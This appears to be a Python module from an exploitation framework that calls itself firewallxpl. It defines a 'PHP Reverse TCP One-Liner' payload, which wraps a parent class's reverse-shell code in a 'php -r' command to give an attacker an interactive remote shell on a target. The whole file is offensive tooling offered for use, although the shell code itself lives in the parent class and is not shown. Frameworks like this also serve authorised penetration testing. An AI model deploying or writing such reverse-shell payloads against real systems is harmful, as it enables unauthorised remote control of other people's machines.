from firewallxpl.core.exploit import *
from firewallxpl.modules.payloads.php.reverse_tcp import Payload as PHPReverseTCP


class Payload(PHPReverseTCP):
    __info__ = {
        "name": "PHP Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using php one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # firewallxpl module
        ),
    }

    cmd = OptString("php", "PHP binary")

    def generate(self):
        self.fmt = self.cmd + ' -r "{}"'
        payload = super(Payload, self).generate()
        return payload
